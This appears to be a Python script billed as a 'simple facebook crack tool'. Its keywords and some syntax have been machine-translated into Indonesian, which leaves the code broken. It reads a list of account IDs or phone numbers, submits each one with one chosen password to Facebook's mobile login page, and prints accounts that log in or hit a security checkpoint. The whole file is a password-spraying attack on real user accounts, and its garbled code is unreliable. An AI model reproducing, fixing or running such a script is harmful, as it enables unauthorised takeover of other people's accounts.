permintaan impor
impor sys
impor argparse
impor os

parser = argparse.ArgumentParser (description = "tools sederhana crack facebook")
parser.add_argument ("- l", "--list", ketik = str, help = "ID listatau telepon")
parser.add_argument ("- p", "--password", ketik = str, help = "Kata sandi untuk diretas")
args = parser.parse_args ()

jumlah = 0

def main ():
	jumlah global
	id = args.list
	pwd = args.password
	url = "https://m.facebook.com/login.php"
	list = open (id, "r"). readlines ()
	untuk email dalam daftar:
		email.split ()
		data = {"email": email, "pass": pwd}
		r = requests.post (url, data = data) .url
		jumlah + = 1
		jika "m_sess" di r atau "save-device" di r:
			print ("[+] ditemukan:% s ~% s"% (email, pwd))
			
		jika "checkpoint" di r:
			cetak ("[*] pos pemeriksaan% s ~% s"% (email, pwd))
			
		print ("\ r [~] crack akun% s |% s"% (jumlah,len (daftar))),; sys.stdout.flush ()
	
jika args.list == Tidak ada atau args.password == Tidak ada:
	os.system ("python2 mbf.py -h")
lain:
    utama()
